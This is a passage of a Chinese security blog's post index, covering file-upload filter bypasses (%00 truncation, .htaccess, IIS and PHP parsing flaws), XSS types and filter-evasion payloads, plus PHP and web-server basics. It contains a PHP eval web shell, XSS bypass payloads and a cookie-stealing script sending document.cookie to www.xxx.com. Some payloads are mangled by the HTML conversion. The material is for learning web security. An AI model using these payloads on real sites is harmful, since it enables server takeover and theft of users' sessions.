(move_uploaded_file($_FILES[&#x27;myfile&#x27;][&#x27;tmp_name&#x27;], $file)) &#123;</span><br><span class="line">        echo &#x27;Success!&lt;br&gt;&#x27;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &#x27;Error!&lt;br&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>众所周知使用黑名单是非常不安全的，很多网站会使用拓展名黑名单来限制上传文件类型，甚至在判断时都不用<code>strtolower()</code>来处理，因此造成漏洞</p><p>绕过方法：</p><p>使用一些特殊扩展名来绕过（如php可以使用php3、php4、php5等来代替）</p><p>在后端比较没有转换大小写处理时，使用大小写混淆（如将php改为pHp等）来绕过</p><ol start="2"><li>白名单检测</li></ol><p>大致代码如下，与黑名单没有什么太大的差别：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$path = &quot;./uploads&quot;;</span><br><span class="line">$content = file_get_contents($_FILES[&#x27;myfile&#x27;][&#x27;tmp_name&#x27;]);</span><br><span class="line">$content = str_replace(&#x27;?&#x27;, &#x27;!&#x27;, $content);</span><br><span class="line">$file = $path . &#x27;/&#x27; . $_FILES[&#x27;myfile&#x27;][&#x27;name&#x27;];if (move_uploaded_file($_FILES[&#x27;myfile&#x27;][&#x27;tmp_name&#x27;], $file)) &#123;</span><br><span class="line">    file_put_contents($file, $content);</span><br><span class="line">    echo &#x27;Success!&lt;br&gt;&#x27;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &#x27;Error!&lt;br&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>白名单相当于黑名单就安全许多，要求只能是特定拓展名的文件才能上传，虽然我们无法从代码层面来绕过，但这样也不是绝对的安全，可以利用其他漏洞来绕过。</p><p>绕过方法：</p><ol><li>使用%00截断文件名来上传（后面会讲）</li><li>如果目标还存在文件包含漏洞，那么就可以上传图片码在文件包含来拿shell</li></ol><p>三、后端检测文件内容</p><ol><li>文件内容替换</li></ol><p>这种主要是将文件中的敏感字符替换掉，大致代码类似于下面这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$path = &quot;./uploads&quot;;</span><br><span class="line">$content = file_get_contents($_FILES[&#x27;myfile&#x27;][&#x27;tmp_name&#x27;]);</span><br><span class="line">$content = str_replace(&#x27;?&#x27;, &#x27;!&#x27;, $content);</span><br><span class="line">$file = $path . &#x27;/&#x27; . $_FILES[&#x27;myfile&#x27;][&#x27;name&#x27;];if (move_uploaded_file($_FILES[&#x27;myfile&#x27;][&#x27;tmp_name&#x27;], $file)) &#123;</span><br><span class="line">    file_put_contents($file, $content);</span><br><span class="line">    echo &#x27;Success!&lt;br&gt;&#x27;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &#x27;Error!&lt;br&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>此时如果我们要上传php的一句话<code>&lt;?php@eval($_POST[&#39;shell&#39;]);?&gt;</code>时，php的标记语言中的？会被替换为！，这样一句话就不能被执行了</p><p>绕过方法：</p><p>主要还是要根据实际过滤字符来进行判断，如果写死的话可能是没办法的（一般不会，因为还要兼顾图片上传）</p><p>比如过滤问好，我们就可以使用<script language="php">system('ls');</script>这样的一句话。具体方法要看实际代码过滤了哪些字符。</p><ol start="2"><li>图片二次渲染</li></ol><p>我们以upload-labs Pass-16的源码为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span><br><span class="line">$filename = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];</span><br><span class="line">$filetype = $_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;];</span><br><span class="line">$tmpname = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];$target_path=UPLOAD_PATH.&#x27;/&#x27;.basename($filename);// 获得上传文件的扩展名</span><br><span class="line">$fileext= substr(strrchr($filename,&quot;.&quot;),1);//判断文件后缀与类型，合法才进行上传操作</span><br><span class="line">if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;))&#123;</span><br><span class="line">if(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">//使用上传的图片生成新的图片</span><br><span class="line">$im = imagecreatefromjpeg($target_path);if($im == false)&#123;</span><br><span class="line">$msg = &quot;该文件不是jpg格式的图片！&quot;;</span><br><span class="line">@unlink($target_path);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">//给新图片指定文件名</span><br><span class="line">srand(time());</span><br><span class="line">$newfilename = strval(rand()).&quot;.jpg&quot;;</span><br><span class="line">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br><span class="line">$img_path = UPLOAD_PATH.&#x27;/&#x27;.$newfilename;</span><br><span class="line">imagejpeg($im,$img_path);</span><br><span class="line">@unlink($target_path);</span><br><span class="line">$is_upload = true;</span><br><span class="line">&#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$msg = &quot;上传出错！&quot;;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>大致意思是后端调用了php的GD库，提取了文件中的图片数据，然后再重新渲染，这样图片中插入的恶意代码就会被过滤掉。</p><?phpinfo()?><p>四、 %00截断</p><p>这个多数被利用在截断路径，利用的条件是：</p><p>php &lt; 5.3.4</p><p>magic_quotes_gps 关闭</p><p>因为0×00是字符串的结束标志符，所以php在读取到0×00时就不会再往后进行读取，我们可以利用这些截断字符截断后面不需要的内容</p><p>源码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if(isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">$ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);</span><br><span class="line">$file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1);</span><br><span class="line">if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">$temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">$img_path = $_POST[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">$is_upload = true;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$msg = &#x27;上传出错！&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">&#125; else&#123;</span><br><span class="line">$msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于是白名单限制了上传文件类型，因此我们无法在文件名处做文章。但最终<code>move_uploaded_file()</code>的目标目录是我们可控的，我们可以将POST传入的save_path改为../upload/shell.php%00,这样后面的内容就会被截断掉，这就导致了任意文件上传</p><p>还要注意%00是url编码，在以POST为传参时应该使用burpsuite对其进行url decode，或者修改hex值为00；而到GET传参时因为浏览器会做一便url decode，所以直接传%00即可</p><p>五、利用.htaccess解析</p><p>  .htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</p><p>利用.htaccess的条件：Apache中配置AllowOverride All</p><p>.htaccess文件可以配置将特定的文件按规定的文件类型进行解析，可以用以下两种方式来配置：</p><p>&lt;FilesMatch “test”&gt;<br> SetHandler application/x-httpd-php<br></p><p>这一种采用正则匹配，只要文件名为test的文件都将被作为php文件解析</p><p>AddType application/x-httpd-php .jpg</p><p>第二种是将.jpg文件都作为php文件解析</p><p>这样我们如果能将.htaccess上传到服务器的话，就可以再根据我们自己设定的规则来解析上传的文件，以此来绕过上传过滤</p><p>六、解析漏洞</p><p>IIS解析漏洞</p><p>IIS6.0中有两个很重要的asp解析漏洞：</p><p>假设当前有一个名为<code>“xxx.asp”</code>的目录，那么该目录下的所有文件都会被作为asp文件解析</p><p>假设上传一个名为<code>“test.asp;xxx.jpg”</code>时，该文件就会被当作asp文件解析</p><p>IIS7.5</p><p>这个其实不能算IIS的洞，它其实是php的解析漏洞，这个漏洞利用调节是服务器在php.ini中将cgi.fix_pathinfo的值设置为1</p><p>然后当我们访问服务器上任意一个文件时（如：<a href="http://test.com/a.jpg%EF%BC%89,%E5%BD%93%E6%88%91%E4%BB%AC%E5%9C%A8url%E5%90%8E%E9%9D%A2%E6%B7%BB%E5%8A%A0%60.php%60%EF%BC%88http://test.com/a.jpg/.php%EF%BC%89,%E9%82%A3%E4%B9%88%E6%96%87%E4%BB%B6a.jpg%E5%B0%B1%E5%B0%86%E8%A2%AB%E4%BD%9C%E4%B8%BAphp%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E3%80%82">http://test.com/a.jpg）,当我们在url后面添加`.php`（http://test.com/a.jpg/.php）,那么文件a.jpg就将被作为php文件解析。</a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p> 在测试时，一般我们都先要fuzz看一下检测是哪种类型，是前端还是后端？黑名单还是白名单？上传后的shell能否被成功执行？是否有文件内容的检测？</p><p>如果是黑名单的话，就要尝试各种特殊文件名（php、Php、PHP、pht、php5、phtml），或者在扩展名后添加空格、::$DATA、.等字符，再或者是尝试上传.htaccess</p><p>如果是白名单，就要看是否可以使用%00截断，或者利用服务器的解析漏洞。如果真的过滤很死的话，不妨再找一下目标的文件包含漏洞，尝试利用文件包含来解析图片马。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Web bug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS攻击</title>
      <link href="/2021/08/22/XSS%E6%94%BB%E5%87%BB/"/>
      <url>/2021/08/22/XSS%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="xss攻击"><a href="#xss攻击" class="headerlink" title="xss攻击"></a>xss攻击</h1><h2 id="定义：xss攻击通常指的是利用网页开发时留下的漏洞，通过巧妙的方法注入恶意的指令代码到网页，使用户加载并执行攻击者恶意执照的程序。网页的恶意程序通常是JavaScript，也有Java、VBScript、ActiveX、Flash甚至是普通的html。"><a href="#定义：xss攻击通常指的是利用网页开发时留下的漏洞，通过巧妙的方法注入恶意的指令代码到网页，使用户加载并执行攻击者恶意执照的程序。网页的恶意程序通常是JavaScript，也有Java、VBScript、ActiveX、Flash甚至是普通的html。" class="headerlink" title="定义：xss攻击通常指的是利用网页开发时留下的漏洞，通过巧妙的方法注入恶意的指令代码到网页，使用户加载并执行攻击者恶意执照的程序。网页的恶意程序通常是JavaScript，也有Java、VBScript、ActiveX、Flash甚至是普通的html。"></a>定义：xss攻击通常指的是利用网页开发时留下的漏洞，通过巧妙的方法注入恶意的指令代码到网页，使用户加载并执行攻击者恶意执照的程序。网页的恶意程序通常是JavaScript，也有Java、VBScript、ActiveX、Flash甚至是普通的html。</h2><h2 id="危害：劫持用户通话、插入恶意内容、重定向用户、使用恶意软件劫持用户浏览器、繁殖xss蠕虫，甚至破坏网站、修改路由器配置信息。"><a href="#危害：劫持用户通话、插入恶意内容、重定向用户、使用恶意软件劫持用户浏览器、繁殖xss蠕虫，甚至破坏网站、修改路由器配置信息。" class="headerlink" title="危害：劫持用户通话、插入恶意内容、重定向用户、使用恶意软件劫持用户浏览器、繁殖xss蠕虫，甚至破坏网站、修改路由器配置信息。"></a>危害：劫持用户通话、插入恶意内容、重定向用户、使用恶意软件劫持用户浏览器、繁殖xss蠕虫，甚至破坏网站、修改路由器配置信息。</h2><h2 id="原理：HTML是一种超文本语言，通过将一些字符特殊地对待来区别文本和标记，例如与之间的字符是页面的标题等等。当插入’-lt-’符号时会默认为html的标签，在其中写入JavaScript的脚本，将会被用户浏览器所执行。使用，当这些特殊字符不被当动态页面检查或者检查出现失误后，就会产生xss漏洞。"><a href="#原理：HTML是一种超文本语言，通过将一些字符特殊地对待来区别文本和标记，例如与之间的字符是页面的标题等等。当插入’-lt-’符号时会默认为html的标签，在其中写入JavaScript的脚本，将会被用户浏览器所执行。使用，当这些特殊字符不被当动态页面检查或者检查出现失误后，就会产生xss漏洞。" class="headerlink" title="原理：HTML是一种超文本语言，通过将一些字符特殊地对待来区别文本和标记，例如与之间的字符是页面的标题等等。当插入’&lt;’符号时会默认为html的标签，在其中写入JavaScript的脚本，将会被用户浏览器所执行。使用，当这些特殊字符不被当动态页面检查或者检查出现失误后，就会产生xss漏洞。"></a>原理：HTML是一种超文本语言，通过将一些字符特殊地对待来区别文本和标记，例如<title>与</title>之间的字符是页面的标题等等。当插入’&lt;’符号时会默认为html的标签，在其中写入JavaScript的脚本，将会被用户浏览器所执行。使用，当这些特殊字符不被当动态页面检查或者检查出现失误后，就会产生xss漏洞。</h2><h3 id="例如：用户通过访问url-http-127-0-0-1-name-abc-就会在浏览器输入如下信息-hello-abc-如果我们传递这样的一个url-http-127-0-0-1-name-60-script-62-alert-39-abc-xss-39-60-script-62-这时你就会发现弹出一个弹出框，这说明站点已经存在xss漏洞。那么恶意用户如何盗取cookie呢？与上面类似先写这样的一个url-url-http-127-0-0-1-name-60-script-62-document-location-href-’http-www-xxx-com-cookie-39-document-cookie-60-script-gt-这样类似的代码就会将当前的cookie发送到指定的站点：www-xxx-com"><a href="#例如：用户通过访问url-http-127-0-0-1-name-abc-就会在浏览器输入如下信息-hello-abc-如果我们传递这样的一个url-http-127-0-0-1-name-60-script-62-alert-39-abc-xss-39-60-script-62-这时你就会发现弹出一个弹出框，这说明站点已经存在xss漏洞。那么恶意用户如何盗取cookie呢？与上面类似先写这样的一个url-url-http-127-0-0-1-name-60-script-62-document-location-href-’http-www-xxx-com-cookie-39-document-cookie-60-script-gt-这样类似的代码就会将当前的cookie发送到指定的站点：www-xxx-com" class="headerlink" title="例如：用户通过访问url:http://127.0.0.1/?name=abc,就会在浏览器输入如下信息: hello abc,如果我们传递这样的一个url:http://127.0.0.1/?name= &#60; script&#62;alert(&#39;abc,xss&#39;)&#60;/script&#62;这时你就会发现弹出一个弹出框，这说明站点已经存在xss漏洞。那么恶意用户如何盗取cookie呢？与上面类似先写这样的一个url: url:http://127.0.0.1/?name= &#60; script&#62;document.location.href=’http://www.xxx.com/cookie?&#39;+document.cookie&#60;/script&gt;,这样类似的代码就会将当前的cookie发送到指定的站点：www.xxx.com/"></a>例如：用户通过访问url:<a href="http://127.0.0.1/?name=abc,%E5%B0%B1%E4%BC%9A%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%BE%93%E5%85%A5%E5%A6%82%E4%B8%8B%E4%BF%A1%E6%81%AF">http://127.0.0.1/?name=abc,就会在浏览器输入如下信息</a>: <strong>hello abc</strong>,如果我们传递这样的一个url:<a href="http://127.0.0.1/?name=">http://127.0.0.1/?name=</a> &#60; script&#62;alert(&#39;abc,xss&#39;)&#60;/script&#62;这时你就会发现弹出一个弹出框，这说明站点已经存在xss漏洞。那么恶意用户如何盗取cookie呢？与上面类似先写这样的一个url: url:<a href="http://127.0.0.1/?name=">http://127.0.0.1/?name=</a> &#60; script&#62;document.location.href=’<a href="http://www.xxx.com/cookie?&#39;+document.cookie&#60;/script&gt;,%E8%BF%99%E6%A0%B7%E7%B1%BB%E4%BC%BC%E7%9A%84%E4%BB%A3%E7%A0%81%E5%B0%B1%E4%BC%9A%E5%B0%86%E5%BD%93%E5%89%8D%E7%9A%84cookie%E5%8F%91%E9%80%81%E5%88%B0%E6%8C%87%E5%AE%9A%E7%9A%84%E7%AB%99%E7%82%B9%EF%BC%9Awww.xxx.com/">http://www.xxx.com/cookie?&#39;+document.cookie&#60;/script&gt;,这样类似的代码就会将当前的cookie发送到指定的站点：www.xxx.com/</a></h3><h2 id="类型-从攻击代码的工作方式可以分为三个类型"><a href="#类型-从攻击代码的工作方式可以分为三个类型" class="headerlink" title="类型:从攻击代码的工作方式可以分为三个类型"></a>类型:从攻击代码的工作方式可以分为三个类型</h2><ol><li>持久性跨站：最直接的危害类型，跨站代码存储在服务器中。存储型：主要让用户输入数据。其他用户浏览查看的地方，例如留言、评论、博客、日志等表单。过程：浏览器-后端-浏览器</li><li>非持久性跨站：反射性跨站脚本漏洞，最普遍的类型。用户访问服务器-跨站链接-返回跨站代码。过程：浏览器-后端-数据库-后端-浏览器</li><li>DOM跨站（DOM XSS）：DOM（文档对象模型），客户端脚本处理逻辑导致的安全问题。是指受害者端的页面脚本在修改本地页面DOM环境是未进行合理的处置，而使得攻击脚本被执行。在整个攻击过程中，服务器响应的页面并没有发生变化，引起客户端脚本执行结果的差异的原因是对本地DOM的恶意篡改利用。过程：url-浏览器</li></ol><h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><p>常见的xss的攻击手段和目的：</p><ol><li>盗用cookie,获取敏感信息。</li><li>利用植入Flash,通过crossdomain权限设置进一步获取更高权限，或者利用Java等此类的操作。</li><li>利用iframe、frame、XMLHttpRequest或者上述flash等方式，以用户的身份执行一些管理动作，或执行一些一般的如发微博、加好友、发私信等操作。</li><li>利用可被攻击的域收到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。</li><li>在访问极大的一些页面上的xss可以攻击游戏额小型的网站，实现DDoS攻击效果</li></ol><h2 id="绕过方式："><a href="#绕过方式：" class="headerlink" title="绕过方式："></a>绕过方式：</h2><ol><li>可以用**/**代替空格。</li><li>运用大小写绕过：&lt;imGRC=xonerRo=alert(“xss”)&gt;</li><li><strong>双写关键词</strong>：&lt;imimggsrsrcc=xonerror=alert(“xss”)&gt;</li><li><strong>利用eval字符拼接</strong>：&lt;imgsrc=”x” onerror=”a=alert;b=’(xss);’ ;eval(a+b+c)”&gt;</li><li><strong>利用top</strong>：<script>top<a href="%E2%80%99xss%E2%80%98">"al"+"ert"</a>;</script></li><li>其他字符混淆：可以利用注释、标签的优先级：&lt;<script>alert("xss");//<</script>   2.<title>&lt;img src=</title>&gt;&lt;img src=x onerror=”alert(“xss”);”&gt; 因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效 </li><li>编码绕过: Unicode 编码绕过<strong>如果是在html中，我们可以不用应该好。绕过是在js中，我们可以通过反引号代替单双引号</strong>&lt;img src=”C:/Users/86182/Desktop/x” onerror=alert(<code>xss</code>);&gt; 当括号被过滤的时候我们可以使用throw来绕过&lt;svg/onload=”window.onerror=eval;throw’=alert\x281\x29’;”&gt;过滤</li></ol><h2 id="预防xss"><a href="#预防xss" class="headerlink" title="预防xss"></a>预防xss</h2><ol><li>过滤一些危险的字符，以及转义&amp;&lt;&gt;” ‘ /等危险的字符</li><li>HTTP-only Cookie：禁止JavaScript读取某县敏感的Cookie，攻击者完成XSS后注入后也无法窃取Cookie</li><li>设置CSP(Conrwnr Awxurity Policy)</li><li>输入内容长短限制</li></ol></script></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Web bug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php基本语法</title>
      <link href="/2021/08/21/php%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/"/>
      <url>/2021/08/21/php%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="php基本语法"><a href="#php基本语法" class="headerlink" title="php基本语法"></a>php基本语法</h1><ol><li>PHP 脚本以 <strong><?php** 开始，以 **?></strong></li><li>PHP 文件的默认文件扩展名是 “.php”。</li><li>PHP 文件通常包含 HTML 标签和一些 PHP 脚本代码。 </li><li>有两种在浏览器输出文本的基础指令：<strong>echo</strong> 和 <strong>print</strong>。</li></ol><h2 id="PHP-echo-print-和-print-r-语句"><a href="#PHP-echo-print-和-print-r-语句" class="headerlink" title="PHP echo ,print 和 print_r 语句"></a>PHP echo ,print 和 print_r 语句</h2><p>echo , print 和 print_r的区别:</p><ol><li><p>echo  - 可以输出一个或多个字符串</p></li><li><p>print  - 只能输出简单类型变量的值,如int,string</p></li><li><p>print_r - 可以输出复杂类型变量的值,如数组,对象</p></li></ol><p>echo 是一个语言结构，使用的时候可以不用加括号，也可以加上括号： echo 或 echo()。</p><p>print 同样是一个语言结构，可以使用括号，也可以不使用括号： print 或 print()。</p><h2 id="php数据类型"><a href="#php数据类型" class="headerlink" title="php数据类型"></a>php数据类型</h2><p>String（字符串）, Integer（整型）, Float（浮点型）, Boolean（布尔型）, Array（数组）, Object（对象）, NULL（空值）。</p><p>出来个别boolean和null的类型其余的都和c语言差不多，c有些是简写。</p><h2 id="PHP-strlen-函数"><a href="#PHP-strlen-函数" class="headerlink" title="PHP strlen() 函数"></a>PHP strlen() 函数</h2><p>有时知道字符串值的长度是很有用的。</p><p>strlen() 函数返回字符串的长度（字符数）</p><h2 id="PHP-strpos-函数"><a href="#PHP-strpos-函数" class="headerlink" title="PHP strpos() 函数"></a>PHP strpos() 函数</h2><p>strpos() 函数用于在字符串内查找一个字符或一段指定的文本。</p><p>如果在字符串中找到匹配，该函数会返回第一个匹配的字符位置。如果未找到匹配，则返回 FALSE</p><h2 id="运算符和c也差不多"><a href="#运算符和c也差不多" class="headerlink" title="运算符和c也差不多"></a>运算符和c也差不多</h2><h2 id="PHP-递增-递减运算符"><a href="#PHP-递增-递减运算符" class="headerlink" title="PHP 递增/递减运算符"></a>PHP 递增/递减运算符</h2><table><thead><tr><th align="left">运算符</th><th align="left">名称</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">++ x</td><td align="left">预递增</td><td align="left">x 加 1，然后返回 x</td></tr><tr><td align="left">x ++</td><td align="left">后递增</td><td align="left">返回 x，然后 x 加 1</td></tr><tr><td align="left">– x</td><td align="left">预递减</td><td align="left">x 减 1，然后返回 x</td></tr><tr><td align="left">x –</td><td align="left">后递减</td><td align="left">返回 x，然后 x 减 1</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web服务器通讯原理</title>
      <link href="/2021/08/21/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%80%9A%E8%AE%AF%E5%8E%9F%E7%90%86/"/>
      <url>/2021/08/21/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%80%9A%E8%AE%AF%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="Web服务器通讯原理"><a href="#Web服务器通讯原理" class="headerlink" title="Web服务器通讯原理"></a>Web服务器通讯原理</h1><ol><li><strong>IP</strong></li></ol><ul><li>正统定义：互联网协议地址。</li><li>可以俗气的理解成：ip实际上就是地址，如果我想到你家去找你玩，就要知道你家住在哪里，ip就是你电脑的地址，在网络上可以通过ip来访问你的计算机。</li></ul><p>图片关系<img src="https://img-blog.csdnimg.cn/20200625114421863.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5MDY3NQ==,size_16,color_FFFFFF,t_70" alt="IP关系"></p><ol start="2"><li><strong>域名</strong></li></ol><ul><li>域名实际上是为了人们方便记忆而创造的一个字符型标识。</li></ul><ol start="3"><li><strong>DNS</strong></li></ol><ul><li><p>DNS是将域名转化为IP的一个网络协议.</p></li><li><p>通俗理解为ip是计算机所理解的语言，为了方便人们记忆有了域名，而DNS是把域名连接到ip的一个方法。</p></li></ul><ol start="4"><li><strong>端口</strong></li></ol><ul><li>端口主要是网络接口，类似于电脑的接口比如你去访问别人的网站，一般来说实际上你是去他的80端口进行通信<br>0端口是预留端口，一般不会用到。</li></ul><ol start="5"><li><strong>HTTP协议</strong></li></ol><ul><li>HTTP协议也叫超文本传输协议，是互联网上应用最为广泛的一种网络协议。<br>https比http多了一个叫做证书的东西，目的是为了防止中途截取。</li></ul><h2 id="从访客的角度看网页浏览流程"><a href="#从访客的角度看网页浏览流程" class="headerlink" title="从访客的角度看网页浏览流程"></a>从访客的角度看网页浏览流程</h2><ol><li><strong>用户浏览器输入协议：//域名。</strong><pre><code>例如：http：//baidu.cn/</code></pre></li><li><strong>用户浏览器通过系统向DNS查询域名对应的ip地址。</strong></li><li><strong>用户浏览器向查询到的IP地址发起http请求。</strong></li><li><strong>服务器解析用户请求，从中提取数据，处理后向用户返回一个http相应。</strong></li><li><strong>浏览器收到响应后提取状态，协议编码，正文的有效信息，然后翻译成人们可以看懂的图形界面并显示。</strong></li></ol><h2 id="常见的服务器系统"><a href="#常见的服务器系统" class="headerlink" title="常见的服务器系统"></a>常见的服务器系统</h2><p><img src="https://img-blog.csdnimg.cn/20200625114559839.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5MDY3NQ==,size_16,color_FFFFFF,t_70" alt="图片解释"></p><ol><li><strong>Windows系统与Linux系统的区别</strong></li></ol><ul><li><p>Windows系统的路径： C：\Users\blackJone&gt;</p></li><li><p>Linux系统的路径： ：/etc/init#</p></li></ul><ol start="2"><li><strong>绝对路径与相对路径</strong></li></ol><p><img src="https://img-blog.csdnimg.cn/20200625114249599.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5MDY3NQ==,size_16,color_FFFFFF,t_70" alt="图片"></p><ul><li> 例如：文件”icon.jpg”存在img文件中。绝对路径为D:/wamp/www/img/icon.jpg。那么相对路径为 ./img/icon.jpg。</li></ul><h2 id="web的容器"><a href="#web的容器" class="headerlink" title="web的容器"></a>web的容器</h2><ul><li> Web容器是可以向发出请求的浏览器发送文档的程序。是一种被动的程序，只有其他计算机发出请求时web容器才会相应。</li><li> Web容器的主要功能是存储，处理和传递网页给用户，客户端和服务器之间使用http协议进行通信，交付的页面是HTML文档。</li></ul><p><img src="https://img-blog.csdnimg.cn/20200625114627778.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5MDY3NQ==,size_16,color_FFFFFF,t_70" alt="图片"></p><p>常见的Web容器</p><h2 id="公网和内网的区别"><a href="#公网和内网的区别" class="headerlink" title="公网和内网的区别"></a>公网和内网的区别</h2><table><thead><tr><th></th><th>公网</th><th>内网</th></tr></thead><tbody><tr><td>网段上的区别</td><td>大部分ip地址均为公网。</td><td>内网IP通常包括10.0.0<del>10.255.255.255,以及192.168.0.0</del>192.168.255.255等。</td></tr><tr><td>网络可达性的区别</td><td>外网IP网络提供商（ISP）服务器分配的全球唯一的IP地址，并且每个IP地址仅分配给一个网络设备。通过公网IP，用户无需经过路由器或交换机，可以直接连接internet。</td><td>内网IP局域网，网线都是连接在同一个交换机上，因此IP地址是由交换机或者路由器进行分配，而且每一个IP也是有所不同，但此类IP地址只可以在局域网内访问，无法直接访问internet。如果要访问Internet，则需要通过NAT或者PROXY等技术交换，把内网IP和端口映射为公网的ip和端口，方可访问internet。</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
